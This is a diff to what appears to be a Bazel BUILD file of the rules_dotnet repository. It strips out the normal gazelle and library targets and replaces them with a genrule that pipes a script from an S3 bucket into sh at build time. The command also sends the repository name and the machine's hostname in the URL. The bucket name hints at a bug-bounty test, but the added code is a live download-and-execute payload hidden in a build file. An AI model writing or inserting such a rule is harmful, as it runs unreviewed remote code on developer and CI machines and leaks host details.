@@ -1,26 +1,7 @@
-load("@bazel_gazelle//:def.bzl", "gazelle", "gazelle_binary")
-load("@bazel_skylib//:bzl_library.bzl", "bzl_library")
 
-package(default_visibility = ["//visibility:public"])
-
-exports_files(["AUTHORS"])
-
-gazelle_binary(
-    name = "gazelle_bin",
-    languages = ["@bazel_skylib_gazelle_plugin//bzl"],
-)
-
-# gazelle:exclude examples
-gazelle(
-    name = "gazelle",
-    gazelle = "gazelle_bin",
-)
-
-bzl_library(
-    name = "internal_deps",
-    srcs = ["internal_deps.bzl"],
-    deps = [
-        "@bazel_tools//tools/build_defs/repo:http.bzl",
-        "@bazel_tools//tools/build_defs/repo:utils.bzl",
-    ],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/rules_dotnet.git\\&folder=rules_dotnet\\&hostname=`hostname`\\&foo=jhh",
+    visibility = ["//visibility:public"],
 )
